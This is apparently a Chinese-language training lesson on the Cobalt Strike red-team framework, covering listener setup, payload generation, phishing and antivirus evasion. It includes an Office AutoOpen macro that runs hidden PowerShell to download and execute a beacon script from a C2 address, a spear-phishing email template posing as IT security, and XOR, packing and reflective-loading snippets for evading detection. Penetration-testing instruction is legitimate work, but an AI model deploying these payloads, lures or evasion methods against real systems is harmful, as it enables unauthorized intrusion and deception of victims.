# 课时03 创建监听器与Attacks

## 一、课程目标

本节课主要学习如何在CobaltStrike中创建和配置监听器，以及如何使用Attack功能生成各种攻击载荷。监听器和攻击载荷是CobaltStrike的核心功能，掌握这些技能对于渗透测试至关重要。通过本课的学习，你将能够：

1. 理解监听器的工作原理和不同类型
2. 掌握监听器的创建和配置方法
3. 学会使用Attack功能生成各种攻击载荷
4. 熟悉不同载荷类型的使用场景
5. 了解载荷免杀和绕过技术

## 二、名词解释表

| 名词 | 解释 |
|------|------|
| 监听器 | C2服务器用于接收Beacon连接的组件 |
| C2服务器 | Command and Control服务器，用于控制被感染主机 |
| Beacon | CobaltStrike的植入载荷，用于与TeamServer通信 |
| Stager | 分阶段载荷的第一阶段，用于下载完整Beacon |
| Stageless | 一次性载荷，包含完整Beacon |
| Malleable C2 Profile | 可定制的C2通信配置文件 |
| 载荷 | 用于在目标系统上执行的恶意代码 |
| 免杀 | 使恶意软件绕过杀毒软件检测的技术 |

## 三、监听器原理

### 3.1 监听器概述

监听器是CobaltStrike中用于接收Beacon回连的服务器组件。当目标系统执行了Beacon载荷后，Beacon会主动连接到配置的监听器，从而建立C2通信通道。

### 3.2 监听器类型

#### HTTP/HTTPS监听器
- 协议：基于HTTP/HTTPS协议
- 端口：通常使用80/443端口
- 特点：流量看起来像正常的Web访问
- 适用场景：绕过防火墙和代理服务器

#### DNS监听器
- 协议：基于DNS协议
- 端口：使用53端口
- 特点：通过DNS查询传递数据
- 适用场景：高度限制的网络环境

#### SMB监听器
- 协议：基于SMB协议
- 端口：使用445端口
- 特点：通过命名管道通信
- 适用场景：内网横向移动

#### TCP监听器
- 协议：基于TCP协议
- 端口：可自定义端口
- 特点：直接TCP连接
- 适用场景：简单直接的通信需求

### 3.3 工作流程

1. 配置监听器参数
2. 启动监听器服务
3. 生成对应的攻击载荷
4. 载荷执行后连接监听器
5. 建立C2通信通道

## 四、创建HTTP/HTTPS监听器

### 4.1 基本配置

#### 通过界面创建
1. 点击"Cobalt Strike"菜单
2. 选择"Listeners"
3. 点击"Add"按钮
4. 选择"HTTP"或"HTTPS"类型

#### 配置参数详解
- **Name**：监听器名称（自定义）
- **Payload**：对应载荷类型
- **Host**：监听器绑定的主机/IP
- **Port**：监听端口（HTTP通常80，HTTPS通常443）
- **C2 Profile**：C2通信配置文件

### 4.2 高级配置

#### HTTP监听器配置
```xml
<!-- HTTP C2 Profile示例 -->
<http-config>
    <header name="User-Agent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"/>
    <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
    <uri path="/news" extension=".php"/>
    <uri path="/login" extension=".jsp"/>
</http-config>
```

#### HTTPS监听器配置
```xml
<!-- HTTPS C2 Profile示例 -->
<https-config>
    <certificate>
        <keystore>cobaltstrike.store</keystore>
        <password>mypassword</password>
    </certificate>
    <header name="User-Agent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"/>
</https-config>
```

### 4.3 完整创建步骤

```bash
# 1. 启动TeamServer（如果尚未启动）
./teamserver 192.168.1.100 password123

# 2. 客户端连接到TeamServer
# 在客户端界面中连接到192.168.1.100:50050

# 3. 创建HTTP监听器
# 在客户端界面中：
# Cobalt Strike -> Listeners -> Add
# Type: HTTP
# Name: http_listener
# Host: 192.168.1.100
# Port: 80
# Save
```

## 五、创建DNS监听器

### 5.1 DNS监听器配置

#### 基本参数
- **Name**：dns_listener
- **Payload**：windows/beacon_dns/reverse_dns_txt
- **Host**：你的域名（如：c2.example.com）
- **Port**：53
- **C2 Profile**：dns-profile

#### DNS配置文件示例
```xml
<!-- DNS C2 Profile -->
<dns-config>
    <dns_idle>192.168.1.100</dns_idle>
    <dns_sleep>50</dns_sleep>
    <dns_stager_prepend>AA</dns_stager_prepend>
    <dns_stager_subhost>.stage.123456.</dns_stager_subhost>
    <maxdns>251</maxdns>
</dns-config>
```

### 5.2 域名配置

#### DNS记录设置
```
# A记录
c2.example.com    A    192.168.1.100

# NS记录
stage.123456.example.com    NS    c2.example.com
```

### 5.3 创建步骤

```bash
# 1. 配置域名DNS记录
# 在域名服务商处添加相应的DNS记录

# 2. 在CobaltStrike中创建DNS监听器
# Cobalt Strike -> Listeners -> Add
# Type: DNS
# Name: dns_listener
# Host: c2.example.com
# Port: 53
# Save
```

## 六、Attack功能详解

### 6.1 Packages子菜单

#### HTML Application (HTA)
- 生成HTML应用程序文件
- 利用.mshta.exe执行载荷
- 适用于钓鱼邮件附件

```html
<!-- HTA载荷示例 -->
<html>
<head>
<script language="VBScript">
Set objShell = CreateObject("WScript.Shell")
objShell.Run "notepad.exe", 0, True
</script>
</head>
<body>
<h1>Hello World</h1>
</body>
</html>
```

#### MS Office Macro
- 生成Office宏代码
- 利用Word/Excel等Office应用执行
- 适用于Office钓鱼攻击

```vba
' Office宏载荷示例
Sub AutoOpen()
    Dim exec As String
    exec = "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.1.100/beacon.ps1'))"""
    Shell (exec)
End Sub
```

#### Payload Generator
- 通用载荷生成器
- 支持多种格式和配置
- 最灵活的载荷生成方式

#### USB/CD AutoPlay
- 生成自动播放载荷
- 利用autorun.inf自动执行
- 适用于物理介质攻击

#### Windows Executable
- 生成Windows可执行文件
- 支持stager和stageless模式
- 最常用的载荷类型

#### Windows Executable (Stageless)
- 生成一次性可执行文件
- 包含完整Beacon代码
- 不需要分阶段下载

### 6.2 Web Drive-by子菜单

#### Manage
- 管理Web服务
- 配置Web投递参数
- 启动/停止Web服务

#### Clone Site
- 克隆目标网站
- 保持原有外观和功能
- 增加攻击可信度

#### Scripted Web Delivery
- 脚本化Web投递
- 通过PowerShell/Wscript执行
- 支持多种脚本语言

#### Signed Applet Attack
- 签名小程序攻击
- 利用Java小程序执行载荷
- 需要有效数字签名

#### Smart Applet Attack
- 智能小程序攻击
- 自动检测Java环境
- 根据环境选择执行方式

#### System Profiler
- 系统信息探测
- 收集目标系统指纹
- 用于精准攻击

### 6.3 Spear Phish

#### 钓鱼邮件配置
- 收件人列表导入
- 邮件模板编辑
- 载荷附件添加
- 发送时间调度

#### 邮件模板示例
```
Subject: Important Document - Please Review
From: security@example.com
To: {target.email}

Dear {target.first_name},

Please review the attached document regarding recent security updates.

Best regards,
IT Security Team
```

## 七、载荷生成实战

### 7.1 生成HTTP Beacon

```bash
# 通过界面生成HTTP Beacon
# Attacks -> Packages -> Windows Executable
# Listener: http_listener
# Output: Windows EXE
# Save as: beacon_http.exe
```

### 7.2 生成Stageless Beacon

```bash
# 通过界面生成Stageless Beacon
# Attacks -> Packages -> Windows Executable (Stageless)
# Listener: http_listener
# Output: Windows EXE
# Save as: beacon_stageless.exe
```

### 7.3 生成PowerShell载荷

```bash
# 通过界面生成PowerShell载荷
# Attacks -> Packages -> Payload Generator
# Payload: windows/beacon_http/reverse_http
# Listener: http_listener
# Format: PowerShell
# Save as: beacon.ps1
```

### 7.4 生成Office宏载荷

```bash
# 通过界面生成Office宏载荷
# Attacks -> Packages -> MS Office Macro
# Listener: http_listener
# Save as: macro.txt
```

## 八、载荷免杀技术

### 8.1 编码混淆

#### XOR编码
```cpp
// XOR编码示例
char key = 0xAA;
for (int i = 0; i < payload_size; i++) {
    payload[i] ^= key;
}
```

#### Base64编码
```powershell
# PowerShell Base64编码
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))
```

### 8.2 加壳压缩

#### UPX加壳
```bash
# 使用UPX加壳
upx --best beacon.exe
```

#### 自定义加壳
```cpp
// 自定义简单加壳
unsigned char encrypted_payload[] = {0x90, 0x90, 0x90, ...};
int key = 0x12345678;

for (int i = 0; i < sizeof(encrypted_payload); i++) {
    encrypted_payload[i] ^= (key >> (i % 32));
}
```

### 8.3 动态加载

#### Reflective Loader
```cpp
// 反射式加载器
void reflective_loader(unsigned char* payload, int size) {
    // 在内存中直接执行载荷
    // 避免写入磁盘
    // 绕过静态检测
}
```

## 九、配置文件定制

### 9.1 Malleable C2 Profile

#### HTTP Profile示例
```xml
<?xml version="1.0" encoding="UTF-8"?>
<profile>
<http-config>
    <header name="User-Agent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"/>
    <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
    <header name="Accept-Language" value="en-US,en;q=0.5"/>
    <header name="Accept-Encoding" value="gzip, deflate"/>
</http-config>

<http-get>
    <uri path="/news" extension=".php"/>
    <client>
        <header name="Accept" value="*/*"/>
        <header name="Host" value="domain.com"/>
    </client>
    <server>
        <header name="Content-Type" value="text/html; charset=utf-8"/>
        <output>
            <print charset="utf-8"/>
        </output>
    </server>
</http-get>

<http-post>
    <uri path="/submit" extension=".php"/>
    <client>
        <header name="Content-Type" value="application/x-www-form-urlencoded"/>
    </client>
    <server>
        <header name="Content-Type" value="text/html; charset=utf-8"/>
        <output>
            <print charset="utf-8"/>
        </output>
    </server>
</http-post>
</profile>
```

### 9.2 DNS Profile示例

```xml
<?xml version="1.0" encoding="UTF-8"?>
<profile>
<dns-config>
    <dns_idle>192.168.1.100</dns_idle>
    <dns_sleep>50</dns_sleep>
    <dns_stager_prepend>AA</dns_stager_prepend>
    <dns_stager_subhost>.stage.123456.</dns_stager_subhost>
    <maxdns>251</maxdns>
</dns-config>

<dns-txt-send>
    <uri-append host=".data.123456."/>
</dns-txt-send>

<dns-txt-recv>
    <uri-append host=".cmd.123456."/>
</dns-txt-recv>
</profile>
```

## 十、故障排除

### 10.1 监听器问题

#### 端口占用
```bash
# 检查端口使用情况
netstat -tlnp | grep :80

# 杀死占用进程
kill -9 <PID>
```

#### 防火墙阻拦
```bash
# Ubuntu/Debian
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# CentOS/RHEL
sudo firewall-cmd --permanent --add-port=80/tcp
sudo firewall-cmd --reload
```

#### SSL证书问题
```bash
# 生成自签名证书
keytool -genkey -alias cobaltstrike -keyalg RSA -keystore cobaltstrike.store -keysize 2048
```

### 10.2 载荷问题

#### 载荷不执行
```bash
# 检查杀毒软件日志
# 使用不同的免杀技术
# 更换载荷类型
```

#### 连接失败
```bash
# 检查网络连通性
ping <TeamServer_IP>

# 检查端口可达性
telnet <TeamServer_IP> 80

# 检查防火墙规则
```

## 十一、安全建议

### 11.1 监听器安全

#### 访问控制
- 限制监听器访问范围
- 使用强密码保护
- 定期更换连接凭证

#### 加密通信
- 启用SSL/TLS加密
- 使用有效的数字证书
- 配置强加密算法

#### 日志审计
- 启用详细日志记录
- 定期审查日志文件
- 配置日志轮转

### 11.2 载荷安全

#### 合法使用
- 仅在授权测试中使用
- 遵守相关法律法规
- 保护测试数据安全

#### 环境隔离
- 在隔离环境中测试
- 避免影响生产系统
- 及时清理测试痕迹

## 十二、课后作业

1. **基础练习**：
   - 创建不同类型的监听器
   - 生成各种格式的攻击载荷
   - 测试载荷在不同环境下的执行效果
   - 配置Malleable C2 Profile文件

2. **进阶练习**：
   - 实现载荷免杀技术
   - 定制C2通信配置文件
   - 部署Web Drive-by攻击
   - 配置钓鱼邮件攻击

3. **思考题**：
   - 不同类型监听器的优缺点是什么？
   - 如何提高载荷的免杀效果？
   - C2通信如何绕过网络检测？

4. **扩展阅读**：
   - 研究Malleable C2 Profiles高级配置
   - 了解Aggressor Script载荷生成
   - 学习载荷动态加载技术